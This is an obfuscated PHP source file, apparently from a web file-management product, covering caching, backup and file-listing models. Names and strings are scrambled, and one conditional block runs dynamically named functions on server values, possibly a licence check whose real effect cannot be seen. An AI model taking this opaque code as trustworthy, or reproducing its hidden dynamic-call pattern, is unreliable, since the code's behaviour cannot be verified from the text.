$ÙÙ„¿éì->end(); $¢¬‚³…› = array($_SERVER[ü¢ÙÊñÛ][888] => 1, $_SERVER[ü¢ÙÊñÛ][826] => time(), $_SERVER[ü¢ÙÊñÛ][840] => 1, $_SERVER[ü¢ÙÊñÛ][816] => $¬éùç·À, $_SERVER[ü¢ÙÊñÛ][889] => time()); if ($ÖêğÓ”) { $¢¬‚³…›[$_SERVER[ü¢ÙÊñÛ][886]] = $ úšæßÆ; $¢¬‚³…›[$_SERVER[ü¢ÙÊñÛ][887]] = $Ä‘Ô„í; } Backup::set($¢¬‚³…›); return !0; } private function _fileExist($”¨º€îÙ, &$ÖÜğß¥§, $Áå€øî) { $Ÿæ›„Ã¨ =& $_SERVER[ü¢ÙÊñÛ]; $Ù äÀ›ş = $”¨º€îÙ[$Ÿæ›„Ã¨[98]]; if (in_array($”¨º€îÙ[$Ÿæ›„Ã¨[552]], $ÖÜğß¥§)) { return !1; } if (!in_array($”¨º€îÙ[$Ÿæ›„Ã¨[883]], $Áå€øî)) { return !1; } if (IO::exist($Ù äÀ›ş)) { return !0; } $·ê‚Ëéã = get_path_father($Ù äÀ›ş); if (IO::exist($·ê‚Ëéã)) { $ÖÜğß¥§[] = $”¨º€îÙ[$Ÿæ›„Ã¨[552]]; return !1; } $èØÏÕ‡à = array($Ÿæ›„Ã¨[883] => $”¨º€îÙ[$Ÿæ›„Ã¨[883]], $Ÿæ›„Ã¨[98] => array($Ÿæ›„Ã¨[470], "{$·ê‚Ëéã}\45")); $ªŠôçŸ = Model($Ÿæ›„Ã¨[855])->where($èØÏÕ‡à)->field($Ÿæ›„Ã¨[553])->select(); $ÖÜğß¥§ = array_merge($ÖÜğß¥§, array_to_keyvalue($ªŠôçŸ, $Ÿæ›„Ã¨[22], $Ÿæ›„Ã¨[552])); return !1; } private function _fileFilter($»ğ¹®È) { $€šĞ¿ŞŸ =& $_SERVER[ü¢ÙÊñÛ]; return; if (empty($»ğ¹®È)) { return; } $Ùœ¢²§ = array($€šĞ¿ŞŸ[552] => array($€šĞ¿ŞŸ[17], array_unique($»ğ¹®È))); $âÜöŸ = Model($€šĞ¿ŞŸ[890])->where($Ùœ¢²§)->field($€šĞ¿ŞŸ[204])->select(); foreach ($âÜöŸ as $óâÜÕá) { Model($€šĞ¿ŞŸ[890])->remove($óâÜÕá[$€šĞ¿ŞŸ[204]], !1); } } private function storeIds() { $ÚÃ¼ïÍÁ =& $_SERVER[ü¢ÙÊñÛ]; $«Ö¿³ş® = Model($ÚÃ¼ïÍÁ[832])->listData(); $Çç¾…ßî = array(); $½Á™ôº = $GLOBALS[$ÚÃ¼ïÍÁ[16]][$ÚÃ¼ïÍÁ[103]][$ÚÃ¼ïÍÁ[891]]; foreach ($«Ö¿³ş® as $§×èµ»ú) { $å˜±â† = strtolower($§×èµ»ú[$ÚÃ¼ïÍÁ[109]]); if (!isset($½Á™ôº[$å˜±â†])) { continue; } $÷²ô¿ÃÆ = $ÚÃ¼ïÍÁ[88] . (isset($½Á™ôº[$å˜±â†]) ? $½Á™ôº[$å˜±â†] : ucfirst($å˜±â†)); if (!class_exists($÷²ô¿ÃÆ)) { continue; } $Çç¾…ßî[] = $§×èµ»ú[$ÚÃ¼ïÍÁ[486]]; } return $Çç¾…ßî; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¼¾±ùã¯ =& $_SERVER[ü¢ÙÊñÛ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¤ş¹´¬» = $GLOBALS[$¼¾±ùã¯[16]][$¼¾±ùã¯[436]]; $÷ˆ×“·– = $¤ş¹´¬»[$¤ş¹´¬»[$¼¾±ùã¯[892]]]; $ªŞÖ€ŞŞ = $¤ş¹´¬»[$¼¾±ùã¯[893]]; switch ($¤ş¹´¬»[$¼¾±ùã¯[892]]) { case $¼¾±ùã¯[31]: self::$handle = Model($¼¾±ùã¯[894]); break; case $¼¾±ùã¯[895]: self::$handle = new CacheRedis($÷ˆ×“·–, $ªŞÖ€ŞŞ); break; case $¼¾±ùã¯[896]: self::$handle = new CacheMemcached($÷ˆ×“·–, $ªŞÖ€ŞŞ); break; case $¼¾±ùã¯[243]: self::$handle = new CacheFile($÷ˆ×“·–, $ªŞÖ€ŞŞ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ã´„ß¡÷) { if (is_array($Ã´„ß¡÷) || is_object($Ã´„ß¡÷)) { $Ã´„ß¡÷ = json_encode($Ã´„ß¡÷); } $Ã´„ß¡÷ = rawurlencode($Ã´„ß¡÷); return md5(KOD_SITE_ID . $_SERVER[ü¢ÙÊñÛ][21] . $Ã´„ß¡÷); } public static function get($ˆáƒ‡×, $å¨ƒşÚí = false) { $¥¾ò©°Ø = self::key($ˆáƒ‡×); $¹Âñ¹× = self::init(); if ($å¨ƒşÚí) { return unserialize($¹Âñ¹×->get($¥¾ò©°Ø)); } if (!isset(self::$memoryCache[$¥¾ò©°Ø])) { $ı“È†Š = $¹Âñ¹×->get($¥¾ò©°Ø); self::$memoryCache[$¥¾ò©°Ø] = unserialize($ı“È†Š); } return self::$memoryCache[$¥¾ò©°Ø]; } public static function set($ª²Úö’, $æ·“ƒ²¦, $”ôÖÀ¬ä = false) { $Á¢íÈ¾ =& $_SERVER[ü¢ÙÊñÛ]; $è•ÒÁî = self::key($ª²Úö’); if (isset(self::$memoryCache[$è•ÒÁî]) && self::$memoryCache[$è•ÒÁî] === $æ·“ƒ²¦) { return !0; } if ($”ôÖÀ¬ä === 0) { self::$memoryCache[$è•ÒÁî] = $æ·“ƒ²¦; return !0; } $®İÄ¶¾Ì = self::init(); $€”ÕºÙö = serialize($æ·“ƒ²¦); CacheLock::lock($ª²Úö’ . $Á¢íÈ¾[897]); $ÎµûéÚ = $®İÄ¶¾Ì->set($è•ÒÁî, $€”ÕºÙö, $”ôÖÀ¬ä); self::$memoryCache[$è•ÒÁî] = $æ·“ƒ²¦; CacheLock::unlock($ª²Úö’ . $Á¢íÈ¾[897]); return $ÎµûéÚ; } public static function getCall($ÊñÆŒå™, $áª†êà, $ÖæÚ®ü³, $§ªØÀ×Ï = array()) { $Ï˜°™ÁÓ =& $_SERVER[ü¢ÙÊñÛ]; $İï¸Ş¢ò = self::get($ÊñÆŒå™); if ($İï¸Ş¢ò || $İï¸Ş¢ò === $Ï˜°™ÁÓ[22]) { return $İï¸Ş¢ò; } $İï¸Ş¢ò = call_user_func_array($ÖæÚ®ü³, $§ªØÀ×Ï); $İï¸Ş¢ò = $İï¸Ş¢ò ? $İï¸Ş¢ò : $Ï˜°™ÁÓ[22]; self::set($ÊñÆŒå™, $İï¸Ş¢ò, $áª†êà); return $İï¸Ş¢ò; } public static function remove($Ÿ–‡ÅÄÜ) { $Ò²ˆÒ©Ø = self::key($Ÿ–‡ÅÄÜ); unset(self::$memoryCache[$Ò²ˆÒ©Ø]); self::clearTimeout(); CacheLock::lock($Ÿ–‡ÅÄÜ); $â¬²Ç“§ = self::init()->remove($Ò²ˆÒ©Ø); CacheLock::unlock($Ÿ–‡ÅÄÜ); return $â¬²Ç“§; } public static function removeMemory($ã°¥Èä) { $èŸêıàõ = self::key($ã°¥Èä); unset(self::$memoryCache[$èŸêıàõ]); } public static function clearMemory($’ËÑÔĞ³ = false) { if ($’ËÑÔĞ³) { $’ËÑÔĞ³ = self::key($’ËÑÔĞ³); unset(self::$memoryCache[$’ËÑÔĞ³]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ü¢ÙÊñÛ][898])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ü¢ÙÊñÛ][899])) { self::init()->clearTimeout(); } } } if ($_SERVER[$_SERVER[ü¢ÙÊñÛ][6]] != $_SERVER[$_SERVER[ü¢ÙÊñÛ][900]]) { $_getc = $_SERVER[ü¢ÙÊñÛ][7]; $_getfile = $_SERVER[$_SERVER[ü¢ÙÊñÛ][8]] . $_SERVER[ü¢ÙÊñÛ][9]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ü¢ÙÊñÛ][10], $_getfilec); if (count($_getarrs) < $_SERVER[ü¢ÙÊñÛ][11]) { $exit = $_SERVER[ü¢ÙÊñÛ][12]; $exit(); } $_act = $_SERVER[ü¢ÙÊñÛ][13]; $_act($_SERVER[$_SERVER[ü¢ÙÊñÛ][4]]); } goto eÜĞîÜ„‹½; Cª‹ËÉ‘Ù–: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\162\x63\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\x6d\145" => "\x69\x6f\137\163\157\x75\162\x63\145\137\x6d\x65\x74\141", "\155\145\x74\141\106\x69\x65\x6c\x64" => "\x73\x6f\165\162\x63\145\x49\104"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\x6e\163\145\162\164", "\x66\165\156\x63\x74\151\157\x6e"), array("\143\x72\x65\141\164\x65\x54\151\x6d\145", "\164\x69\x6d\x65", "\151\x6e\163\145\x72\164", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\x76\x69\145\167\124\151\155\145", "\x74\x69\155\x65", "\151\x6e\163\145\162\x74", "\146\x75\x6e\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ğ¹¼¥¼) { return $this->listSource(array($_SERVER[ü¢ÙÊñÛ][488] => $ğ¹¼¥¼)); } public function typeName($ÜˆÕÎºû) { static $¦ö‹Íæá = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\x67\x72\x6f\165\160"); return $¦ö‹Íæá[$ÜˆÕÎºû . $_SERVER[ü¢ÙÊñÛ][22]]; } public function sourceListInfo($é€ıĞß˜, $Êº°Ø = false) { $ë¥®ºˆÛ =& $_SERVER[ü¢ÙÊñÛ]; $é€ıĞß˜ = $é€ıĞß˜ ? $é€ıĞß˜ : array(); $é€ıĞß˜ = array_filter(array_unique($é€ıĞß˜)); if (!$é€ıĞß˜) { return array(); } $„€¢›ç˜ = $this->where(array($ë¥®ºˆÛ[204] => array($ë¥®ºˆÛ[17], $é€ıĞß˜)))->select(); $this->_listDataApply($„€¢›ç˜, $Êº°Ø); return array_to_keyvalue($„€¢›ç˜, $ë¥®ºˆÛ[204]); } public function pathInfoFilter(&$®„É‰éê) { $£Ç„È®Ó =& $_SERVER[ü¢ÙÊñÛ]; static $™Ä¸„¤  = false; static $ùÜ™ÆĞğ = false; static $ßµßôø¡ = false; if (!$™Ä¸„¤ ) { $×ôÀÂÂ = $£Ç„È®Ó[489]; $×ôÀÂÂ .= $£Ç„È®Ó[490]; $×ôÀÂÂ .= $£Ç„È®Ó[491]; $ßï˜Èş = $£Ç„È®Ó[492]; $ÜÃƒôõ† = explode($£Ç„È®Ó[60], $ßï˜Èş); $™Ä¸„¤  = explode($£Ç„È®Ó[60], $×ôÀÂÂ); $ùÜ™ÆĞğ = array(); foreach ($™Ä¸„¤  as $Çï·¬‚¼) { if (in_array($Çï·¬‚¼, $ÜÃƒôõ†)) { continue; } $ùÜ™ÆĞğ[] = $Çï·¬‚¼; } $ßµßôø¡ = explode($£Ç„È®Ó[60], $£Ç„È®Ó[493]); } foreach ($ßµßôø¡ as $Á½‰„î™) { if (isset($®„É‰éê[$Á½‰„î™])) { $®„É‰éê[$Á½‰„î™] = intval($®„É‰éê[$Á½‰„î™]); } } $®„É‰éê[$£Ç„È®Ó[98]] = $£Ç„È®Ó[494] . $®„É‰éê[$£Ç„È®Ó[204]] . $£Ç„È®Ó[495]; $®„É‰éê[$£Ç„È®Ó[43]] = $®„É‰éê[$£Ç„È®Ó[496]] == 1 ? $£Ç„È®Ó[89] : $£Ç„È®Ó[243]; $®„É‰éê[$£Ç„È®Ó[201]] = $this->typeName($®„É‰éê[$£Ç„È®Ó[201]]); if ($®„É‰éê[$£Ç„È®Ó[496]] != 1) { $®„É‰éê[$£Ç„È®Ó[180]] = $®„É‰éê[$£Ç„È®Ó[497]]; unset($®„É‰éê[$£Ç„È®Ó[497]]); } $¦‡ÃŞÆœ = $™Ä¸„¤ ; if (isset($®„É‰éê[$£Ç„È®Ó[498]]) && $®„É‰éê[$£Ç„È®Ó[498]][$£Ç„È®Ó[499]] == -1) { $¦‡ÃŞÆœ = $ùÜ™ÆĞğ; } $®„É‰éê = array_field_key($®„É‰éê, $¦‡ÃŞÆœ); return $®„É‰éê; } public function listUserFav() { $³Ãäæ =& $_SERVER[ü¢ÙÊñÛ]; $²ôııñÊ = Model($³Ãäæ[500])->listData(); $Œßõˆº = array_filter_by_field($²ôııñÊ, $³Ãäæ[43], $³Ãäæ[501]); $Œßõˆº = array_to_keyvalue($Œßõˆº, $³Ãäæ[22], $³Ãäæ[98]); if ($Œßõˆº) { $Ø‡¶À· = $this->listSource(array($³Ãäæ[502] => array($³Ãäæ[503], $Œßõˆº))); } $Ø‡¶À· = array_to_keyvalue($Ø‡¶À·[$³Ãäæ[457]], $³Ãäæ[204]); foreach ($²ôııñÊ as &$Â’†ºŠÑ) { $Â’†ºŠÑ = array($³Ãäæ[504] => $Â’†ºŠÑ[$³Ãäæ[486]], $³Ãäæ[505] => $Â’†ºŠÑ[$³Ãäæ[42]], $³Ãäæ[506] => $Â’†ºŠÑ[$³Ãäæ[98]], $³Ãäæ[507] => $Â’†ºŠÑ[$³Ãäæ[43]], $³Ãäæ[508] => $Â’†ºŠÑ[$³Ãäæ[244]], $³Ãäæ[509] => $Â’†ºŠÑ[$³Ãäæ[99]]); if ($Â’†ºŠÑ[$³Ãäæ[43]] == $³Ãäæ[501] && $Ø‡¶À·[$Â’†ºŠÑ[$³Ãäæ[98]]]) { $Â’†ºŠÑ[$³Ãäæ[101]] = $Ø‡¶À·[$Â’†ºŠÑ[$³Ãäæ[98]]]; } } unset($Â’†ºŠÑ); return $²ôııñÊ; } public function listUserTag($°°‰ÇğŠ) { $™°¹ÃÎÊ =& $_SERVER[ü¢ÙÊñÛ]; if ($°°‰ÇğŠ && !is_array($°°‰ÇğŠ)) { $°°‰ÇğŠ = array($°°‰ÇğŠ); } $ÃšÇ„ÉÄ = Model($™°¹ÃÎÊ[510])->listData(); $ñîÙƒ = array(); $¬–ğ¡î = array(); foreach ($ÃšÇ„ÉÄ as $Ï²ªó­è) { $ƒò¹ä´ = $Ï²ªó­è[$™°¹ÃÎÊ[98]]; if (!$ƒò¹ä´) { continue; } if (!isset($¬–ğ¡î[$ƒò¹ä´])) { $¬–ğ¡î[$ƒò¹ä´] = array(); } $¬–ğ¡î[$ƒò¹ä´][] = $Ï²ªó­è[$™°¹ÃÎÊ[511]]; $ñîÙƒ[$Ï²ªó­è[$™°¹ÃÎÊ[98]]] = $Ï²ªó­è; } $ì¿£€ÇÇ = array(); $Ú­Û—Ş” = array(); $‘çÎå©º = array(); foreach ($¬–ğ¡î as $˜÷€Œç => $ššéä¯ß) { $Ùçï¦€— = !0; if (!$°°‰ÇğŠ) { $ì¿£€ÇÇ[] = $˜÷€Œç; continue; } foreach ($°°‰ÇğŠ as $·É­µÖ) { if (!in_array($·É­µÖ, $ššéä¯ß)) { $Ùçï¦€— = !1; break; } } if (!$Ùçï¦€—) { continue; } if (!is_numeric($˜÷€Œç)) { $¤óä¼å‚ = $ñîÙƒ[$˜÷€Œç]; $Á™äÛ = array($™°¹ÃÎÊ[42] => $¤óä¼å‚[$™°¹ÃÎÊ[42]], $™°¹ÃÎÊ[98] => $¤óä¼å‚[$™°¹ÃÎÊ[98]], $™°¹ÃÎÊ[43] => $¤óä¼å‚[$™°¹ÃÎÊ[43]], $™°¹ÃÎÊ[101] => array($™°¹ÃÎÊ[512] => 1), $™°¹ÃÎÊ[245] => !0); if ($¤óä¼å‚[$™°¹ÃÎÊ[43]] == $™°¹ÃÎÊ[243]) { $‘çÎå©º[] = $Á™äÛ; } if ($¤óä¼å‚[$™°¹ÃÎÊ[43]] == $™°¹ÃÎÊ[89]) { $Ú­Û—Ş”[] = $Á™äÛ; } continue; } $ì¿£€ÇÇ[] = $˜÷€Œç; } if ($ì¿£€ÇÇ) { $Œ‹ô·¸¦ = $this->listSource(array($™°¹ÃÎÊ[502] => array($™°¹ÃÎÊ[503], $ì¿£€ÇÇ))); } $Œ‹ô·¸¦ = $Œ‹ô·¸¦ ? $Œ‹ô·¸¦ : array($™°¹ÃÎÊ[96] => array(), $™°¹ÃÎÊ[97] => array()); $Œ‹ô·¸¦[$™°¹ÃÎÊ[96]] = array_merge($Œ‹ô·¸¦[$™°¹ÃÎÊ[96]], $Ú­Û—Ş”); $Œ‹ô·¸¦[$™°¹ÃÎÊ[97]] = array_merge($Œ‹ô·¸¦[$™°¹ÃÎÊ[97]], $‘çÎå©º); if (isset($Œ‹ô·¸¦[$™°¹ÃÎÊ[454]]) && count($ì¿£€ÇÇ) == $Œ‹ô·¸¦[$™°¹ÃÎÊ[454]][$™°¹ÃÎÊ[455]]) { return $Œ‹ô·¸¦; } $ä•Ü¯ò = array(); $‹¹àÜÀ² = array_to_keyvalue($Œ‹ô·¸¦[$™°¹ÃÎÊ[96]], $™°¹ÃÎÊ[22], $™°¹ÃÎÊ[204]); $‚›äÆñÇ = array_to_keyvalue($Œ‹ô·¸¦[$™°¹ÃÎÊ[97]], $™°¹ÃÎÊ[22], $™°¹ÃÎÊ[204]); $Ñê´Äá = array_merge($‚›äÆñÇ, $‹¹àÜÀ²); foreach ($ì¿£€ÇÇ as $ƒò¹ä´) { if (!in_array($ƒò¹ä´, $Ñê´Äá)) { $ä•Ü¯ò[] = $ƒò¹ä´; } } if ($ä•Ü¯ò) { Model($™°¹ÃÎÊ[513])->removeBySource($ä•Ü¯ò); } return $Œ‹ô·¸¦; } public function listUserRecycle() { $Õ¾îØ”É =& $_SERVER[ü¢ÙÊñÛ]; $ØâïñÊ¹ = Model($Õ¾îØ”É[514])->listData(); if (!$ØâïñÊ¹) { return array(); } $¼Ñ×¶´ˆ = array($Õ¾îØ”É[502] => array($Õ¾îØ”É[503], $ØâïñÊ¹), $Õ¾îØ”É[515] => 1); return $this->listSource($¼Ñ×¶´ˆ); } public function listSource($¿­¥ã§œ, $¯÷œãé‡ = 3000, $ŞŞ×ê¿· = false) { $îËÛŠ˜æ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($¿­¥ã§œ[$îËÛŠ˜æ[516]])) { $¿­¥ã§œ[$îËÛŠ˜æ[516]] = 0; } if (isset($¿­¥ã§œ[$îËÛŠ˜æ[203]]) && $¿­¥ã§œ[$îËÛŠ˜æ[203]] == $îËÛŠ˜æ[241]) { $¿­¥ã§œ[$îËÛŠ˜æ[497]] = array($îËÛŠ˜æ[517], $îËÛŠ˜æ[22]); } $›‚ìöªÉ = $îËÛŠ˜æ[518]; $”†¬¸¡ë = $this->field($›‚ìöªÉ)->_makeOrder()->where($¿­¥ã§œ)->selectPage($¯÷œãé‡); $this->_listPageCheck($”†¬¸¡ë, $›‚ìöªÉ, $¿­¥ã§œ); $this->_listDataApply($”†¬¸¡ë[$îËÛŠ˜æ[457]], $ŞŞ×ê¿·); $this->_listMake($”†¬¸¡ë); return $”†¬¸¡ë; } private function _listPageCheck(&$ßç¿Ïëğ, $Ñ¡¬²°, $Å¿şîó) { $ò¨òŒÛ‘ =& $_SERVER[ü¢ÙÊñÛ]; if (!is_array($ßç¿Ïëğ[$ò¨òŒÛ‘[454]])) { return; } $Äœ àãª = $ßç¿Ïëğ[$ò¨òŒÛ‘[454]]; if ($Äœ àãª[$ò¨òŒÛ‘[456]] <= 1) { return; } if ($Äœ àãª[$ò¨òŒÛ‘[455]] >= 100000) { return; } if (Model($ò¨òŒÛ‘[519])->get($ò¨òŒÛ‘[520]) != $ò¨òŒÛ‘[521]) { return; } $Ñ¡¬²° = str_replace(array($ò¨òŒÛ‘[63], $ò¨òŒÛ‘[429], $ò¨òŒÛ‘[10]), $ò¨òŒÛ‘[22], $Ñ¡¬²°); $Ñ¡¬²° = $ò¨òŒÛ‘[522] . str_replace($ò¨òŒÛ‘[60], $ò¨òŒÛ‘[523], $Ñ¡¬²°) . $ò¨òŒÛ‘[524]; $üÑö‰Ù– = $ò¨òŒÛ‘[525]; $üÑö‰Ù– = $üÑö‰Ù– . $ò¨òŒÛ‘[526]; $±µ¾ñ = $Äœ àãª[$ò¨òŒÛ‘[451]] * ($Äœ àãª[$ò¨òŒÛ‘[440]] - 1) . $ò¨òŒÛ‘[60] . $Äœ àãª[$ò¨òŒÛ‘[451]]; $øÂö±Ëë = $this->_makeOrder(!0); $ÕíÊôÄŞ = $ò¨òŒÛ‘[522] . str_replace($ò¨òŒÛ‘[60], $ò¨òŒÛ‘[523], $øÂö±Ëë[0]); if (strpos($ÕíÊôÄŞ, $ò¨òŒÛ‘[527])) { $ÕíÊôÄŞ = str_replace($ò¨òŒÛ‘[527], $ò¨òŒÛ‘[528], $ÕíÊôÄŞ); } else { $ÕíÊôÄŞ .= $ò¨òŒÛ‘[529] . $øÂö±Ëë[1]; } $ßÙë¥× = array(); foreach ($Å¿şîó as $£êåûúĞ => $Õê¦âô) { $ßÙë¥×[$ò¨òŒÛ‘[522] . $£êåûúĞ] = $Õê¦âô; } $this->alias($ò¨òŒÛ‘[530])->field($Ñ¡¬²°)->limit($±µ¾ñ)->order($ÕíÊôÄŞ); $õ™¦àĞÒ = $this->join($üÑö‰Ù–)->where($ßÙë¥×)->select(); if ($õ™¦àĞÒ) { $ßç¿Ïëğ[$ò¨òŒÛ‘[457]] = $õ™¦àĞÒ; } } protected function _makeOrder($–ğÂí ¬ = false) { $çñØèº =& $_SERVER[ü¢ÙÊñÛ]; $…Ÿî¶· = Model($çñØèº[531])->get($çñØèº[532]); $¸Ö±üÀ€ = Model($çñØèº[531])->get($çñØèº[533]); $ÙûÊ¥Éñ = array($çñØèº[534] => $çñØèº[535], $çñØèº[536] => $çñØèº[537]); $ºå»‡¼ = array($çñØèº[42] => $çñØèº[42], $çñØèº[90] => $çñØèº[90], $çñØèº[180] => $çñØèº[497], $çñØèº[538] => $çñØèº[538], $çñØèº[539] => $çñØèº[540], $çñØèº[244] => $çñØèº[244], $çñØèº[99] => $çñØèº[99]); $¥ˆÄ»œî = Input::get($çñØèº[541], $çñØèº[17], $…Ÿî¶·, array_keys($ºå»‡¼)); $ÈòîŸê = Input::get($çñØèº[542], $çñØèº[17], $¸Ö±üÀ€, array_keys($ÙûÊ¥Éñ)); if (!in_array($¥ˆÄ»œî, array_keys($ºå»‡¼))) { $¥ˆÄ»œî = $çñØèº[42]; } if (!in_array($ÈòîŸê, array_keys($ÙûÊ¥Éñ))) { $¥ˆÄ»œî = $çñØèº[534]; } if ($¥ˆÄ»œî == $çñØèº[42]) { } $¨˜ŞŠ³š = $çñØèº[543] . $ºå»‡¼[$¥ˆÄ»œî] . $çñØèº[63] . $ÙûÊ¥Éñ[$ÈòîŸê]; $¨˜ŞŠ³š = rtrim(trim($¨˜ŞŠ³š), $çñØèº[60]); if ($–ğÂí ¬) { return array($¨˜ŞŠ³š, $ÙûÊ¥Éñ[$ÈòîŸê]); } return $this->order($¨˜ŞŠ³š); } protected function _listDataApplyItem($÷µ‹¥ş½, $‘¤…İ¨ = false) { $¬Ä¤Å = array($÷µ‹¥ş½); $this->_listDataApply($¬Ä¤Å, $‘¤…İ¨); return $¬Ä¤Å[0]; } protected function _listDataApply(&$×üü¸ôì, $ªèğ¼„ = false) { $°„™äĞ© =& $_SERVER[ü¢ÙÊñÛ]; if (!$×üü¸ôì) { $×üü¸ôì = array(); return; } $µŞÚîø = array_to_keyvalue($×üü¸ôì, $°„™äĞ©[22], $°„™äĞ©[204]); $µŞÚîø = array_unique($µŞÚîø); $this->_listSourceCache($×üü¸ôì); if (!$ªèğ¼„) { $this->_listAppendMeta($×üü¸ôì, $µŞÚîø); $this->_listAppendFileMeta($×üü¸ôì, $µŞÚîø); $this->_listAppendChildren($×üü¸ôì, $µŞÚîø); } $this->_listAppendPath($×üü¸ôì); $this->_listAppendAuth($×üü¸ôì); $this->_listAppendSourceInfo($×üü¸ôì, $µŞÚîø); $this->_listAppendUser($×üü¸ôì); $this->_listFilterInfo($×üü¸ôì, $ªèğ¼„); $this->_listAppendAuthSecret($×üü¸ôì); } protected function _listSourceCache($’¥ôÙÈº) { $ãáŸîÂâ =& $_SERVER[ü¢ÙÊñÛ]; foreach ($’¥ôÙÈº as $Ìò™ûû’) { self::$cacheSourceInfo[$ãáŸîÂâ[544] . $Ìò™ûû’[$ãáŸîÂâ[204]]] = $Ìò™ûû’; } } protected function _listFilterInfo(&$ÓÄ£¥ß, $À¾Š¡õ = false) { $’›ÀÔàò =& $_SERVER[ü¢ÙÊñÛ]; foreach ($ÓÄ£¥ß as &$²Ìö¸£á) { $²Ìö¸£á = $this->pathInfoFilter($²Ìö¸£á); self::$cachePathInfo[$’›ÀÔàò[545] . intval($À¾Š¡õ) . $’›ÀÔàò[473] . $²Ìö¸£á[$’›ÀÔàò[204]]] = $²Ìö¸£á; } unset($²Ìö¸£á); } protected function _listMake(&$á§Ğ¯£) { $ì€¥‡–ó =& $_SERVER[ü¢ÙÊñÛ]; $á§Ğ¯£[$ì€¥‡–ó[96]] = array(); $á§Ğ¯£[$ì€¥‡–ó[97]] = array(); foreach ($á§Ğ¯£[$ì€¥‡–ó[457]] as $Ìõˆ¨´º) { $‡Æø¥‰ˆ = $Ìõˆ¨´º[$ì€¥‡–ó[496]] == 1 ? $ì€¥‡–ó[96] : $ì€¥‡–ó[97]; $á§Ğ¯£[$‡Æø¥‰ˆ][] = $Ìõˆ¨´º; } unset($á§Ğ¯£[$ì€¥‡–ó[457]]); } protected function _listAppendMeta(&$ƒÅ–£ô , $¬¼¨±®Ñ) { $£±÷Ü¾È =& $_SERVER[ü¢ÙÊñÛ]; $´‚Ãºº” = array($£±÷Ü¾È[502] => array($£±÷Ü¾È[503], $¬¼¨±®Ñ)); $ë›ÊçÃ¨ = Model($£±÷Ü¾È[546])->field($£±÷Ü¾È[547])->where($´‚Ãºº”)->select(); if (!$ë›ÊçÃ¨) { return; } $ËƒÊîÊ = array($£±÷Ü¾È[548], $£±÷Ü¾È[549], $£±÷Ü¾È[528]); $¤ëŞÎ“¼ = array(); foreach ($ë›ÊçÃ¨ as $©¬ı„”¤) { if (!isset($¤ëŞÎ“¼[$©¬ı„”¤[$£±÷Ü¾È[204]]])) { $¤ëŞÎ“¼[$©¬ı„”¤[$£±÷Ü¾È[204]]] = array(); } if (in_array($©¬ı„”¤[$£±÷Ü¾È[108]], $ËƒÊîÊ)) { continue; } $¤ëŞÎ“¼[$©¬ı„”¤[$£±÷Ü¾È[204]]][$©¬ı„”¤[$£±÷Ü¾È[108]]] = $©¬ı„”¤[$£±÷Ü¾È[462]]; } foreach ($ƒÅ–£ô  as &$òŒ´Ó°ı) { $òŒ´Ó°ı[$£±÷Ü¾È[550]] = !1; if (isset($¤ëŞÎ“¼[$òŒ´Ó°ı[$£±÷Ü¾È[204]]])) { $òŒ´Ó°ı[$£±÷Ü¾È[550]] = $¤ëŞÎ“¼[$òŒ´Ó°ı[$£±÷Ü¾È[204]]]; } if ($this->fileIsLock($òŒ´Ó°ı) && $òŒ´Ó°ı[$£±÷Ü¾È[498]]) { $öì¤œ—ƒ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $òŒ´Ó°ı[$£±÷Ü¾È[498]][$£±÷Ü¾È[499]] = AuthModel::authDisable($òŒ´Ó°ı[$£±÷Ü¾È[498]][$£±÷Ü¾È[499]], $öì¤œ—ƒ); $òŒ´Ó°ı[$£±÷Ü¾È[498]][$£±÷Ü¾È[551]][$£±÷Ü¾È[498]] = $òŒ´Ó°ı[$£±÷Ü¾È[498]][$£±÷Ü¾È[499]]; } } unset($òŒ´Ó°ı); } protected function _listAppendFileMeta(&$í×·”ê·, $Ÿ¨ºšÉÛ) { $Ş­‚ùµ¿ =& $_SERVER[ü¢ÙÊñÛ]; $¡€³¼ = array_to_keyvalue($í×·”ê·, $Ş­‚ùµ¿[22], $Ş­‚ùµ¿[552]); $¡€³¼ = array_filter(array_unique($¡€³¼)); if (!$¡€³¼) { return; } $À¤ıé‘ğ = array($Ş­‚ùµ¿[553] => array($Ş­‚ùµ¿[503], $¡€³¼)); $¤Ë‡¬Ó” = $Ş­‚ùµ¿[554]; $––›×© = Model($Ş­‚ùµ¿[555])->field($¤Ë‡¬Ó”)->where($À¤ıé‘ğ)->select(); $––›×© = array_to_keyvalue($––›×©, $Ş­‚ùµ¿[552]); $ûÌ×â¬à = Model($Ş­‚ùµ¿[556])->field($Ş­‚ùµ¿[557])->where($À¤ıé‘ğ)->select(); $ûÌ×â¬à = $ûÌ×â¬à ? $ûÌ×â¬à : array(); $¦®ÍÎÚŒ = array(); foreach ($ûÌ×â¬à as $Á™„·µ) { if (!isset($¦®ÍÎÚŒ[$Á™„·µ[$Ş­‚ùµ¿[552]]])) { $¦®ÍÎÚŒ[$Á™„·µ[$Ş­‚ùµ¿[552]]] = array(); } $¦®ÍÎÚŒ[$Á™„·µ[$Ş­‚ùµ¿[552]]][$Á™„·µ[$Ş­‚ùµ¿[108]]] = $Á™„·µ[$Ş­‚ùµ¿[462]]; } foreach ($í×·”ê· as &$ß²Çô¥) { $øÂ…Íá = $ß²Çô¥[$Ş­‚ùµ¿[552]]; if (!$øÂ…Íá || !is_array($––›×©[$øÂ…Íá])) { continue; } 